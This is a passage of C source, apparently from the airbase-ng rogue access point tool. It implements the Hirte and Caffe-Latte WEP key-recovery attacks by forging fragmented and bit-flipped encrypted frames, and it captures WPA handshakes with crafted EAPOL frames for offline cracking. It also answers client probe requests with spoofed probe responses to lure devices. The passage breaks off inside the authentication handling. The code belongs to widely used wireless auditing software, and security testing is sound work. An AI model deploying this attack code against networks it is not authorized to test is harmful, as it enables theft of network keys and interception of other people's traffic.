			memcpy(packet + 16, opt.r_smac, 6);
		}
		packet[22] = 0xD0; // frag = 0;
		packet[23] = 0x50;

		// need to shift by 10 bytes; (add 1 frag in front)
		memcpy(frag1, packet, z + 4); // copy 80211 header and IV
		frag1[1] |= 0x04; // more frags
		memcpy(frag1 + z + 4, S_LLC_SNAP_ARP, 8);
		frag1[z + 4 + 8] = 0x00;
		frag1[z + 4 + 9] = 0x01; // ethernet
		add_crc32(frag1 + z + 4, 10);
		for (i = 0; i < 14; i++) (frag1 + z + 4)[i] ^= keystream[i];
		/* frag1 finished */

		for (i = 0; i < length; i++) flip[i] = clear[i] ^ final[i];

		add_crc32_plain(flip, (int) (length - z - 4 - 4));

		for (i = 0; i < length - z - 4; i++) (packet + z + 4)[i] ^= flip[i];
		packet[22] = 0xD1; // frag = 1;

		// ready to send frag1 / len=z+4+10+4 and packet / len = length
	}
	else
	{
		/* process IP */
		isarp = 0;
		// build the new packet
		set_clear_ip(clear, length - z - 4 - 8 - 4);
		set_final_ip(final, opt.r_smac);

		for (i = 0; i < 8; i++) keystream[i] = (packet + z + 4)[i] ^ clear[i];

		// correct 80211 header
		packet[0] = 0x08; // data
		if ((packet[1] & 3) == 0x00) // ad-hoc
		{
			packet[1] = 0x40; // wep
			memcpy(packet + 4, smac, 6);
			memcpy(packet + 10, opt.r_smac, 6);
			memcpy(packet + 16, bssid, 6);
		}
		else
		{
			packet[1] = 0x42; // wep+FromDS
			memcpy(packet + 4, smac, 6);
			memcpy(packet + 10, bssid, 6);
			memcpy(packet + 16, opt.r_smac, 6);
		}
		packet[22] = 0xD0; // frag = 0;
		packet[23] = 0x50;

		// need to shift by 12 bytes;(add 3 frags in front)
		memcpy(frag1, packet, z + 4); // copy 80211 header and IV
		memcpy(frag2, packet, z + 4); // copy 80211 header and IV
		memcpy(frag3, packet, z + 4); // copy 80211 header and IV
		frag1[1] |= 0x04; // more frags
		frag2[1] |= 0x04; // more frags
		frag3[1] |= 0x04; // more frags

		memcpy(frag1 + z + 4, S_LLC_SNAP_ARP, 4); //-V512
		add_crc32(frag1 + z + 4, 4);
		for (i = 0; i < 8; i++) (frag1 + z + 4)[i] ^= keystream[i];

		memcpy(frag2 + z + 4, S_LLC_SNAP_ARP + 4, 4);
		add_crc32(frag2 + z + 4, 4);
		for (i = 0; i < 8; i++) (frag2 + z + 4)[i] ^= keystream[i];
		frag2[22] = 0xD1; // frag = 1;

		frag3[z + 4 + 0] = 0x00; //-V525
		frag3[z + 4 + 1] = 0x01; // ether
		frag3[z + 4 + 2] = 0x08; // IP
		frag3[z + 4 + 3] = 0x00;
		add_crc32(frag3 + z + 4, 4);
		for (i = 0; i < 8; i++) (frag3 + z + 4)[i] ^= keystream[i];
		frag3[22] = 0xD2; // frag = 2;
		/* frag1,2,3 finished */

		for (i = 0; i < length; i++) flip[i] = clear[i] ^ final[i];

		add_crc32_plain(flip, (int) (length - z - 4 - 4));

		for (i = 0; i < length - z - 4; i++) (packet + z + 4)[i] ^= flip[i];
		packet[22] = 0xD3; // frag = 3;

		// ready to send frag1,2,3 / len=z+4+4+4 and packet / len = length
	}
	while (curCF->next != NULL) curCF = curCF->next;

	ALLEGE(pthread_mutex_lock(&mx_cf) == 0);

	curCF->next = (pCF_t) malloc(sizeof(struct CF_packet));
	ALLEGE(curCF->next != NULL);
	curCF = curCF->next;
	curCF->xmitcount = 0;
	curCF->next = NULL;

	if (isarp)
	{
		memcpy(curCF->frags[0], frag1, z + 4 + 10 + 4);
		curCF->fraglen[0] = z + 4 + 10 + 4;
		memcpy(curCF->final, packet, length);
		curCF->finallen = length;
		curCF->fragnum = 1; /* one frag and final frame */
	}
	else
	{
		memcpy(curCF->frags[0], frag1, z + 4 + 4 + 4);
		memcpy(curCF->frags[1], frag2, z + 4 + 4 + 4);
		memcpy(curCF->frags[2], frag3, z + 4 + 4 + 4);
		curCF->fraglen[0] = z + 4 + 4 + 4;
		curCF->fraglen[1] = z + 4 + 4 + 4;
		curCF->fraglen[2] = z + 4 + 4 + 4;
		memcpy(curCF->final, packet, length);
		curCF->finallen = length;
		curCF->fragnum = 3; /* three frags and final frame */
	}

	lopt.cf_count++;

	ALLEGE(pthread_mutex_unlock(&mx_cf) == 0);

	if (lopt.cf_count == 1 && !opt.quiet)
	{
		PCT;
		printf("Starting Hirte attack against %02X:%02X:%02X:%02X:%02X:%02X at "
			   "%d pps.\n",
			   smac[0],
			   smac[1],
			   smac[2],
			   smac[3],
			   smac[4],
			   smac[5],
			   opt.r_nbpps);
	}

	if (opt.verbose)
	{
		PCT;
		printf("Added %s packet to cfrag buffer.\n", isarp ? "ARP" : "IP");
	}

	return (0);
}

// add packet for caffe latte attack
static int addarp(unsigned char * packet, int length)
{
	unsigned char bssid[6], smac[6], dmac[6];
	unsigned char flip[4096];
	int z = 0, i = 0;

	if (packet == NULL) return (-1);

	if (length != 68 && length != 86) return (-1);

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if ((packet[1] & 3) == 0)
	{
		memcpy(dmac, packet + 4, 6);
		memcpy(smac, packet + 10, 6);
		memcpy(bssid, packet + 16, 6);
	}
	else
	{
		memcpy(dmac, packet + 4, 6);
		memcpy(bssid, packet + 10, 6);
		memcpy(smac, packet + 16, 6);
	}

	if (memcmp(dmac, BROADCAST, 6) != 0) return (-1);

	if (memcmp(bssid, opt.r_bssid, 6) != 0) return (-1);

	packet[21] ^= (rand_u8() + 1); // Sohail:flip sender MAC address since
	// few clients do not honor ARP from its
	// own MAC

	if (lopt.nb_arp >= opt.ringbuffer) return (-1);

	memset(flip, 0, 4096);

	flip[49 - z - 4]
		^= (rand_u8() + 1); // flip random bits in last byte of sender MAC
	flip[53 - z - 4]
		^= (rand_u8() + 1); // flip random bits in last byte of sender IP

	add_crc32_plain(flip, length - z - 4 - 4);
	for (i = 0; i < length - z - 4; i++) (packet + z + 4)[i] ^= flip[i];

	arp[lopt.nb_arp].buf = (unsigned char *) malloc(length);
	ALLEGE(arp[lopt.nb_arp].buf != NULL);
	arp[lopt.nb_arp].len = length;
	memcpy(arp[lopt.nb_arp].buf, packet, length);
	lopt.nb_arp++;

	if (lopt.nb_arp == 1 && !opt.quiet)
	{
		PCT;
		printf("Starting Caffe-Latte attack against "
			   "%02X:%02X:%02X:%02X:%02X:%02X at %d pps.\n",
			   smac[0],
			   smac[1],
			   smac[2],
			   smac[3],
			   smac[4],
			   smac[5],
			   opt.r_nbpps);
	}

	if (opt.verbose)
	{
		PCT;
		printf("Added an ARP to the caffe-latte ringbuffer %d/%d\n",
			   lopt.nb_arp,
			   opt.ringbuffer);
	}

	return (0);
}

static int store_wpa_handshake(struct ST_info * st_cur)
{
	FILE * f_ivs;
	struct ivs2_filehdr fivs2;
	char ofn[1024];
	struct ivs2_pkthdr ivs2;

	if (st_cur == NULL) return (1);

	fivs2.version = IVS2_VERSION;

	snprintf(ofn,
			 sizeof(ofn) - 1,
			 "wpa-%02d-%02X-%02X-%02X-%02X-%02X-%02X.%s",
			 opt.f_index,
			 st_cur->stmac[0],
			 st_cur->stmac[1],
			 st_cur->stmac[2],
			 st_cur->stmac[3],
			 st_cur->stmac[4],
			 st_cur->stmac[5],
			 IVS2_EXTENSION);

	opt.f_index++;

	if ((f_ivs = fopen(ofn, "wb+")) == NULL)
	{
		perror("fopen failed");
		fprintf(stderr, "Could not create \"%s\".\n", ofn);
		return (1);
	}

	if (fwrite(IVS2_MAGIC, 1, 4, f_ivs) != (size_t) 4)
	{
		perror("fwrite(IVs file MAGIC) failed");
		fclose(f_ivs);
		return (1);
	}

	if (fwrite(&fivs2, 1, sizeof(struct ivs2_filehdr), f_ivs)
		!= (size_t) sizeof(struct ivs2_filehdr))
	{
		perror("fwrite(IVs file header) failed");
		fclose(f_ivs);
		return (1);
	}

	memset(&ivs2, '\x00', sizeof(struct ivs2_pkthdr));

	// write stmac as bssid and essid
	ivs2.flags = 0;
	ivs2.len = 0;

	ivs2.len += st_cur->essid_length;
	ivs2.flags |= IVS2_ESSID;

	ivs2.flags |= IVS2_BSSID;
	ivs2.len += 6;

	if (fwrite(&ivs2, 1, sizeof(struct ivs2_pkthdr), f_ivs)
		!= (size_t) sizeof(struct ivs2_pkthdr))
	{
		perror("fwrite(IV header) failed");
		fclose(f_ivs);
		return (1);
	}

	if (fwrite(opt.r_bssid, 1, 6, f_ivs) != (size_t) 6)
	{
		perror("fwrite(IV bssid) failed");
		fclose(f_ivs);
		return (1);
	}
	ivs2.len -= 6;

	/* write essid */
	if (fwrite(st_cur->essid, 1, (size_t) st_cur->essid_length, f_ivs)
		!= (size_t) st_cur->essid_length)
	{
		perror("fwrite(IV essid) failed");
		fclose(f_ivs);
		return (1);
	}

	// add wpa data
	ivs2.flags = 0;

	ivs2.len = sizeof(struct WPA_hdsk);
	ivs2.flags |= IVS2_WPA;

	if (fwrite(&ivs2, 1, sizeof(struct ivs2_pkthdr), f_ivs)
		!= (size_t) sizeof(struct ivs2_pkthdr))
	{
		perror("fwrite(IV header) failed");
		fclose(f_ivs);
		return (1);
	}

	if (fwrite(&(st_cur->wpa), 1, sizeof(struct WPA_hdsk), f_ivs)
		!= (size_t) sizeof(struct WPA_hdsk))
	{
		perror("fwrite(IV wpa_hdsk) failed");
		fclose(f_ivs);
		return (1);
	}

	fclose(f_ivs);

	return (0);
}

static int
packet_recv(uint8_t * packet, size_t length, struct AP_conf * apc, int external)
{
	REQUIRE(packet != NULL);

	uint8_t K[64];
	uint8_t bssid[6];
	uint8_t smac[6];
	uint8_t dmac[6];
	size_t trailer = 0;
	uint8_t * tag = NULL;
	size_t len = 0;
	size_t i = 0;
	int c = 0;
	uint8_t * buffer;
	uint8_t essid[256];
	struct timeval tv1;
	uint64_t timestamp;
	char fessid[MAX_IE_ELEMENT_SIZE + 1];
	int seqnum, fragnum, morefrag;
	int gotsource, gotbssid;
	int remaining;
	// Is the frame a reassociation request?
	int reasso;
	int fixed, temp_channel;
	uint8_t bytes2use;
	unsigned z;

	struct ST_info * st_cur = NULL;
	struct ST_info * st_prv = NULL;

	reasso = 0;
	fixed = 0;
	memset(essid, 0, 256);

	ALLEGE(pthread_mutex_lock(&mx_cap) == 0);
	if (lopt.record_data) capture_packet(packet, (int) length);
	ALLEGE(pthread_mutex_unlock(&mx_cap) == 0);

	// Check if the frame has 4 addresses (ToDS and FromDS present), and save base length
	z = ((packet[1] & IEEE80211_FC1_DIR_MASK) != IEEE80211_FC1_DIR_DSTODS) ? 24
																		   : 30;

	/* handle QoS field in data frame: they're 2 bytes longer */
	if (packet[0] == (IEEE80211_FC0_SUBTYPE_QOS | IEEE80211_FC0_TYPE_DATA))
		z += 2;

	if (length < z)
	{
		return (1);
	}

	if (length > 3800)
	{
		return (1);
	}

	// Grab MAC addresses
	switch (packet[1] & IEEE80211_FC1_DIR_MASK)
	{
		case IEEE80211_FC1_DIR_NODS:
			memcpy(bssid, packet + 16, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case IEEE80211_FC1_DIR_TODS:
			memcpy(bssid, packet + 4, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case IEEE80211_FC1_DIR_FROMDS:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 16, 6);
			break;
		default:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 24, 6);
			break;
	}

	if ((packet[1] & IEEE80211_FC1_DIR_MASK) == IEEE80211_FC1_DIR_DSTODS)
	{
		/* no wds support yet */
		return (1);
	}

	/* MAC Filter */
	if (lopt.filter >= 0)
	{
		if (getMACcount(rClient) > 0)
		{
			/* filter clients */
			gotsource = gotMAC(rClient, smac);

			if ((gotsource && lopt.filter == BLOCK_MACS)
				|| (!gotsource && lopt.filter == ALLOW_MACS))
				return (0);
		}
		if (getMACcount(rBSSID) > 0)
		{
			/* filter bssids */
			gotbssid = gotMAC(rBSSID, bssid);

			if ((gotbssid && lopt.filter == BLOCK_MACS)
				|| (!gotbssid && lopt.filter == ALLOW_MACS))
				return (0);
		}
	}

	/* check list of clients */
	st_cur = lopt.st_1st;
	st_prv = NULL;

	while (st_cur != NULL)
	{
		if (!memcmp(st_cur->stmac, smac, 6)) break;

		st_prv = st_cur;
		st_cur = st_cur->next;
	}

	/* if it's a new client, add it */

	if (st_cur == NULL)
	{
		if (!(st_cur = (struct ST_info *) malloc(sizeof(struct ST_info))))
		{
			perror("malloc failed");
			return (1);
		}

		memset(st_cur, 0, sizeof(struct ST_info));

		if (lopt.st_1st == NULL)
			lopt.st_1st = st_cur;
		else
			st_prv->next = st_cur;

		memcpy(st_cur->stmac, smac, 6);

		st_cur->prev = st_prv;

		st_cur->tinit = time(NULL);
		st_cur->tlast = time(NULL);

		st_cur->power = -1;
		st_cur->rate_to = -1;
		st_cur->rate_from = -1;

		st_cur->probe_index = -1;
		st_cur->missed = 0;
		st_cur->lastseq = 0;
		gettimeofday(&(st_cur->ftimer), NULL);

		for (i = 0; i < NB_PRB; i++)
		{
			memset(st_cur->probes[i], 0, sizeof(st_cur->probes[i]));
			st_cur->ssid_length[i] = 0;
		}

		memset(st_cur->essid, 0, ESSID_LENGTH + 1);
		st_cur->essid_length = 0;

		st_cur->wpatype = 0;
		st_cur->wpahash = 0;
		st_cur->wep = 0;

		lopt.st_end = st_cur;
	}

	/* Got a data packet with our bssid set and ToDS==1*/
	if (memcmp(bssid, opt.r_bssid, 6) == 0 && (packet[0] & 0x08) == 0x08
		&& (packet[1] & 0x03) == 0x01)
	{
		fragnum = packet[22] & 0x0F;
		seqnum = (packet[22] >> 4) | (packet[23] << 4);
		morefrag = packet[1] & 0x04;

		/* Fragment? */
		if (fragnum > 0 || morefrag)
		{
			addFrag(packet,
					smac,
					(int) length,
					opt.crypt,
					opt.wepkey,
					(int) opt.weplen);
			buffer = getCompleteFrag(
				smac, seqnum, &len, opt.crypt, opt.wepkey, (int) opt.weplen);
			timeoutFrag();

			/* we got frag, no compelete packet avail -> do nothing */
			if (buffer == NULL) return (1);

			memcpy(packet, buffer, len);
			length = len;
			free(buffer);
			buffer = NULL;
		}

		/* intercept packets in case we got external processing */
		if (external)
		{
			intercept(packet, (int) length);
			return (0);
		}

		/* To our mac? */
		if ((memcmp(dmac, opt.r_bssid, 6) == 0 && !lopt.adhoc)
			|| (memcmp(dmac, opt.r_smac, 6) == 0 && lopt.adhoc))
		{
			/* Is encrypted */
			if ((packet[z] != packet[z + 1] || packet[z + 2] != 0x03)
				&& (packet[1] & 0x40) == 0x40)
			{
				/* check the extended IV flag */
				/* WEP and we got the key */
				if ((packet[z + 3] & 0x20) == 0 && opt.crypt == CRYPT_WEP
					&& !lopt.cf_attack)
				{
					memcpy(K, packet + z, 3);
					memcpy(K + 3, opt.wepkey, opt.weplen);

					if (decrypt_wep(packet + z + 4,
									(int) (length - z - 4),
									K,
									(int) (3u + opt.weplen))
						== 0)
					{
						return (1);
					}

					/* WEP data packet was successfully decrypted, *
					* remove the WEP IV & ICV and write the data  */

					length -= 8;

					memcpy(packet + z, packet + z + 4, length - z);

					packet[1] &= 0xBF;
				}
				else
				{
					if (lopt.cf_attack)
					{
						addCF(packet, length);
						return (0);
					}

					/* it's a packet for us, but we either don't have the key or
					 * its WPA -> throw it away */
					return (0);
				}
			}
			else
			{
				/* unencrypted data packet, nothing special, send it through
				 * dev_ti */
				if (lopt.sendeapol
					&& memcmp(packet + z,
							  "\xAA\xAA\x03\x00\x00\x00\x88\x8E\x01\x01",
							  10)
						   == 0)
				{
					/* got eapol start frame */
					if (opt.verbose)
					{
						PCT;
						printf("Got EAPOL start frame from "
							   "%02X:%02X:%02X:%02X:%02X:%02X\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5]);
					}
					st_cur->wpa.state = 0;

					if (lopt.use_fixed_nonce)
					{
						memcpy(st_cur->wpa.anonce, lopt.fixed_nonce, 32);
					}
					else
					{
						for (i = 0; i < 32; i++)
							st_cur->wpa.anonce[i] = rand_u8();
					}
					st_cur->wpa.state |= 1;

					/* build first eapol frame */
					memcpy(h80211, "\x08\x02\xd5\x00", 4);
					len = 4;

					memcpy(h80211 + len, smac, 6);
					len += 6;
					memcpy(h80211 + len, bssid, 6);
					len += 6;
					memcpy(h80211 + len, bssid, 6);
					len += 6;

					h80211[len] = 0x60;
					h80211[len + 1] = 0x0f;
					len += 2;

					// llc+snap
					memcpy(h80211 + len, "\xAA\xAA\x03\x00\x00\x00\x88\x8E", 8);
					len += 8;

					// eapol
					memset(h80211 + len, 0, 99);
					h80211[len] = 0x01; // version
					h80211[len + 1] = 0x03; // type
					h80211[len + 2] = 0x00;
					h80211[len + 3] = 0x5F; // len
					if (lopt.wpa1type) h80211[len + 4] = 0xFE; // WPA1

					if (lopt.wpa2type) h80211[len + 4] = 0x02; // WPA2

					if (!lopt.wpa1type && !lopt.wpa2type)
					{
						if (st_cur->wpatype == 1) // WPA1
							h80211[len + 4] = 0xFE; // WPA1
						else if (st_cur->wpatype == 2)
							h80211[len + 4] = 0x02; // WPA2
					}

					if (lopt.sendeapol >= 1 && lopt.sendeapol <= 2) // specified
					{
						if (lopt.sendeapol == 1) // MD5
						{
							h80211[len + 5] = 0x00;
							h80211[len + 6] = 0x89;
						}
						else // SHA1
						{
							h80211[len + 5] = 0x00;
							h80211[len + 6] = 0x8a;
						}
					}
					else // from asso
					{
						if (st_cur->wpahash == 1) // MD5
						{
							h80211[len + 5] = 0x00;
							h80211[len + 6] = 0x89;
						}
						else if (st_cur->wpahash == 2) // SHA1
						{
							h80211[len + 5] = 0x00;
							h80211[len + 6] = 0x8a;
						}
					}

					h80211[len + 7] = 0x00;
					h80211[len + 8] = 0x20; // keylen

					memset(h80211 + len + 9, 0, 90);
					memcpy(h80211 + len + 17, st_cur->wpa.anonce, 32);

					len += 99;

					my_send_packet(h80211, len);
					return (0);
				}

				if (lopt.sendeapol
					&& memcmp(packet + z,
							  "\xAA\xAA\x03\x00\x00\x00\x88\x8E\x01\x03",
							  10)
						   == 0)
				{
					st_cur->wpa.eapol_size = (uint32_t)(
						(packet[z + 8 + 2] << 8) + packet[z + 8 + 3] + 4);

					if ((unsigned) length - z - 10 < st_cur->wpa.eapol_size
						|| st_cur->wpa.eapol_size == 0 //-V560
						|| st_cur->wpa.eapol_size > sizeof(st_cur->wpa.eapol))
					{
						// Ignore the packet trying to crash us.
						st_cur->wpa.eapol_size = 0;
						return (1);
					}

					/* got eapol frame num 2 */
					memcpy(st_cur->wpa.snonce, &packet[z + 8 + 17], 32);
					st_cur->wpa.state |= 2;

					memcpy(st_cur->wpa.keymic, &packet[z + 8 + 81], 16);
					memcpy(st_cur->wpa.eapol,
						   &packet[z + 8],
						   st_cur->wpa.eapol_size);
					memset(st_cur->wpa.eapol + 81, 0, 16);
					st_cur->wpa.state |= 4;
					st_cur->wpa.keyver = (uint8_t)(packet[z + 8 + 6] & 7);

					memcpy(st_cur->wpa.stmac, st_cur->stmac, 6);

					store_wpa_handshake(st_cur);
					if (!opt.quiet)
					{
						PCT;
						printf("Got WPA handshake from "
							   "%02X:%02X:%02X:%02X:%02X:%02X\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5]);
					}

					return (0);
				}
			}
		}
		else
		{
			packet[1] &= 0xFC; // clear ToDS/FromDS
			if (!lopt.adhoc)
			{
				/* Our bssid, ToDS=1, but to a different destination MAC -> send
				 * it through both interfaces */
				packet[1] |= 0x02; // set FromDS=1
				memcpy(packet + 4, dmac, 6);
				memcpy(packet + 10, bssid, 6);
				memcpy(packet + 16, smac, 6);
			}
			else
			{
				/* adhoc, don't replay */
				memcpy(packet + 4, dmac, 6);
				memcpy(packet + 10, smac, 6);
				memcpy(packet + 16, bssid, 6);
			}
			/* Is encrypted */
			if ((packet[z] != packet[z + 1] || packet[z + 2] != 0x03)
				&& (packet[1] & 0x40) == 0x40)
			{
				/* check the extended IV flag */
				/* WEP and we got the key */
				if ((packet[z + 3] & 0x20) == 0 && opt.crypt == CRYPT_WEP
					&& !lopt.caffelatte
					&& !lopt.cf_attack)
				{
					memcpy(K, packet + z, 3);
					memcpy(K + 3, opt.wepkey, opt.weplen);

					if (decrypt_wep(packet + z + 4,
									(int) (length - z - 4u),
									K,
									(int) (3u + opt.weplen))
						== 0)
					{
						return (1);
					}

					/* WEP data packet was successfully decrypted, *
					* remove the WEP IV & ICV and write the data  */

					length -= 8;

					memcpy(packet + z, packet + z + 4, length - z);

					packet[1] &= 0xBF;

					/* reencrypt it to send it with a new IV */
					memcpy(h80211, packet, length);

					if (create_wep_packet(h80211, &length, z) != 0) return (1);

					if (!lopt.adhoc) my_send_packet(h80211, length);
				}
				else
				{
					if (lopt.caffelatte)
					{
						addarp(packet, (int) length);
					}
					if (lopt.cf_attack)
					{
						addCF(packet, length);
					}
					/* it's a packet we can't decrypt -> just replay it through
					 * the wireless interface */
					return (0);
				}
			}
			else
			{
				/* unencrypted -> send it through the wireless interface */
				my_send_packet(packet, length);
			}
		}

		memcpy(h80211, dmac, 6); // DST_MAC
		memcpy(h80211 + 6, smac, 6); // SRC_MAC

		memcpy(h80211 + 12, packet + z + 6, 2); // copy ether type

		if (length <= z + 8) return (1);

		memcpy(h80211 + 14, packet + z + 8, length - z - 8);
		length = length - z - 8 + 14;

		// ethernet frame must be at least 60 bytes without fcs
		if (length < 60)
		{
			trailer = 60 - length;
			memset(h80211 + length, 0, trailer);
			length += trailer;
		}

		ti_write(dev.dv_ti, h80211, (int) length);
	}
	else if ((packet[0] & IEEE80211_FC0_TYPE_MASK) == IEEE80211_FC0_TYPE_MGT)
	{
		// react on management frames
		// probe request -> send probe response if essid matches. if broadcast
		// probe, ignore it.
		if ((packet[0] & IEEE80211_FC0_SUBTYPE_MASK)
			== IEEE80211_FC0_SUBTYPE_PROBE_REQ)
		{
			tag = parse_tags(packet + z, 0, (int) (length - z), &len);
			if (tag != NULL && tag[0] >= 32 && len <= 255) // directed probe
			{
				if (lopt.promiscuous || !lopt.f_essid
					|| gotESSID((char *) tag, (int) len) == 1)
				{
					memset(essid, 0, 256);
					memcpy(essid, tag, len);

					/* store probes */
					if (len > 0 && essid[0] == 0) goto skip_probe;

					/* got a valid probed ESSID */

					/* add this to the beacon queue */
					if (lopt.beacon_cache)
						addESSID((char *) essid, (int) len, lopt.beacon_cache);

					/* check if it's already in the ring buffer */
					for (i = 0; i < NB_PRB; i++)
						if (memcmp(st_cur->probes[i], essid, len) == 0)
							goto skip_probe;

					st_cur->probe_index = (st_cur->probe_index + 1) % NB_PRB;
					memset(st_cur->probes[st_cur->probe_index], 0, 256);
					memcpy(st_cur->probes[st_cur->probe_index],
						   essid,
						   len); // twice?!
					st_cur->ssid_length[st_cur->probe_index] = (int) len;

					for (i = 0; i < len; i++)
					{
						c = essid[i];
						if (c == 0 || (c > 126 && c < 160))
							c = '.'; // could also check ||(c>0 && c<32)
						st_cur->probes[st_cur->probe_index][i] = (char) c;
					}

				skip_probe:

					// transform into probe response
					packet[0] = 0x50;

					if (opt.verbose)
					{
						PCT;
						printf("Got directed probe request from "
							   "%02X:%02X:%02X:%02X:%02X:%02X - \"%s\"\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5],
							   essid);
					}

					// store the tagged parameters and insert the fixed ones
					buffer = (uint8_t *) malloc(length - z);
					ALLEGE(buffer != NULL);
					memcpy(buffer, packet + z, length - z);

					memcpy(packet + z,
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
						   12); // fixed information
					packet[z + 8]
						= (uint8_t)((apc->interval) & 0xFF); // beacon interval
					packet[z + 9] = (uint8_t)((apc->interval >> 8) & 0xFF);
					memcpy(packet + z + 10, apc->capa, 2); // capability

					// set timestamp
					gettimeofday(&tv1, NULL);
					timestamp = tv1.tv_sec * 1000000UL + tv1.tv_usec;

					// copy timestamp into response; a mod 2^64 counter
					// incremented each microsecond
					for (i = 0; i < 8; i++)
					{
						packet[z + i]
							= (uint8_t)((timestamp >> (i * 8)) & 0xFF);
					}

					// insert tagged parameters
					memcpy(packet + z + 12, buffer, length - z);
					length += 12;
					free(buffer);
					buffer = NULL;

					// add channel
					packet[length] = 0x03;
					packet[length + 1] = 0x01;
					temp_channel = wi_get_channel(_wi_in); // current channel
					if (!invalid_channel_displayed)
					{
						if (temp_channel > 255)
						{
							// Display error message once
							invalid_channel_displayed = 1;
							fprintf(stderr,
									"Error: Got channel %d, expected a value < "
									"256.\n",
									temp_channel);
						}
						else if (temp_channel < 1)
						{
							invalid_channel_displayed = 1;
							fprintf(stderr,
									"Error: Got channel %d, expected a value > "
									"0.\n",
									temp_channel);
						}
					}
					packet[length + 2]
						= (uint8_t)(((temp_channel > 255 || temp_channel < 1)
									 && lopt.channel != 0)
										? lopt.channel
										: temp_channel);

					length += 3;

					memcpy(packet + 4, smac, 6);
					memcpy(packet + 10, opt.r_bssid, 6);
					memcpy(packet + 16, opt.r_bssid, 6);

					// TODO: See also about 100 lines below
					if (lopt.allwpa)
					{
						memcpy(packet + length,
							   ALL_WPA2_TAGS,
							   sizeof(ALL_WPA2_TAGS) - 1);
						length += sizeof(ALL_WPA2_TAGS) - 1;
						memcpy(packet + length,
							   ALL_WPA1_TAGS,
							   sizeof(ALL_WPA1_TAGS) - 1);
						length += sizeof(ALL_WPA1_TAGS) - 1;
					}
					else
					{
						if (lopt.wpa2type > 0)
						{
							memcpy(packet + length, WPA2_TAG, 22);
							packet[length + 7] = (uint8_t) lopt.wpa2type;
							packet[length + 13] = (uint8_t) lopt.wpa2type;
							length += 22;
						}

						if (lopt.wpa1type > 0)
						{
							memcpy(packet + length, WPA1_TAG, 24);
							packet[length + 11] = (uint8_t) lopt.wpa1type;
							packet[length + 17] = (uint8_t) lopt.wpa1type;
							length += 24;
						}
					}

					my_send_packet(packet, length);
					return (0);
				}
			}
			else // broadcast probe
			{
				if (!lopt.nobroadprobe)
				{
					// transform into probe response
					packet[0] = 0x50;

					if (opt.verbose)
					{
						PCT;
						printf("Got broadcast probe request from "
							   "%02X:%02X:%02X:%02X:%02X:%02X\n",
							   smac[0],
							   smac[1],
							   smac[2],
							   smac[3],
							   smac[4],
							   smac[5]);
					}

					// store the tagged parameters and insert the fixed ones
					buffer = (uint8_t *) malloc(length - z);
					ALLEGE(buffer != NULL);
					memcpy(buffer, packet + z, length - z);

					memcpy(packet + z,
						   "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
						   12); // fixed information
					packet[z + 8]
						= (uint8_t)((apc->interval) & 0xFF); // beacon interval
					packet[z + 9] = (uint8_t)((apc->interval >> 8) & 0xFF);
					memcpy(packet + z + 10, apc->capa, 2); // capability

					// set timestamp
					gettimeofday(&tv1, NULL);
					timestamp = tv1.tv_sec * 1000000UL + tv1.tv_usec;

					// copy timestamp into response; a mod 2^64 counter
					// incremented each microsecond
					for (i = 0; i < 8; i++)
					{
						packet[z + i]
							= (uint8_t)((timestamp >> (i * 8)) & 0xFF);
					}

					// insert essid
					len = (size_t) getESSID(fessid);
					if (!len)
					{
						strncpy(fessid, "default", sizeof(fessid) - 1);
						len = strlen(fessid);
					}
					packet[z + 12] = 0x00;
					packet[z + 13] = (uint8_t) len;
					memcpy(packet + z + 14, fessid, len);

					// insert tagged parameters
					memcpy(packet + z + 14 + len,
						   buffer,
						   length
							   - z); // now we got 2 essid tags... ignore that

					length += 12; // fixed info
					free(buffer);
					buffer = NULL;
					length += 2 + len; // default essid

					// add channel
					packet[length] = 0x03;
					packet[length + 1] = 0x01;
					temp_channel = wi_get_channel(_wi_in); // current channel
					if (!invalid_channel_displayed)
					{
						if (temp_channel > 255)
						{
							// Display error message once
							invalid_channel_displayed = 1;
							fprintf(stderr,
									"Error: Got channel %d, expected a value < "
									"256.\n",
									temp_channel);
						}
						else if (temp_channel < 1)
						{
							invalid_channel_displayed = 1;
							fprintf(stderr,
									"Error: Got channel %d, expected a value > "
									"0.\n",
									temp_channel);
						}
					}
					packet[length + 2]
						= (uint8_t)(((temp_channel > 255 || temp_channel < 1)
									 && lopt.channel != 0)
										? lopt.channel
										: temp_channel);

					length += 3;

					memcpy(packet + 4, smac, 6);
					memcpy(packet + 10, opt.r_bssid, 6);
					memcpy(packet + 16, opt.r_bssid, 6);

					// TODO: See also around ~3500
					if (lopt.allwpa)
					{
						memcpy(packet + length,
							   ALL_WPA2_TAGS,
							   sizeof(ALL_WPA2_TAGS) - 1);
						length += sizeof(ALL_WPA2_TAGS) - 1;
						memcpy(packet + length,
							   ALL_WPA1_TAGS,
							   sizeof(ALL_WPA1_TAGS) - 1);
						length += sizeof(ALL_WPA1_TAGS) - 1;
					}
					else
					{
						if (lopt.wpa2type > 0)
						{
							memcpy(packet + length, WPA2_TAG, 22);
							packet[length + 7] = (uint8_t) lopt.wpa2type;
							packet[length + 13] = (uint8_t) lopt.wpa2type;
							length += 22;
						}

						if (lopt.wpa1type > 0)
						{
							memcpy(packet + length, WPA1_TAG, 24);
							packet[length + 11] = (uint8_t) lopt.wpa1type;
							packet[length + 17] = (uint8_t) lopt.wpa1type;
							length += 24;
						}
					}

					my_send_packet(packet, length);
					my_send_packet(packet, length);
					my_send_packet(packet, length);

					return (0);
				}
			}
		}

		// auth req
		if ((packet[0] & IEEE80211_FC0_SUBTYPE_MASK)
				== IEEE80211_FC0_SUBTYPE_AUTH
			&& memcmp(bssid, opt.r_bssid, 6) == 0)
		{
			if (packet[z] == 0x00) // open system auth
			{
				// make sure it's an auth request
				if (packet[z + 2] == 0x01)
				{
					if (opt.verbose)
					{
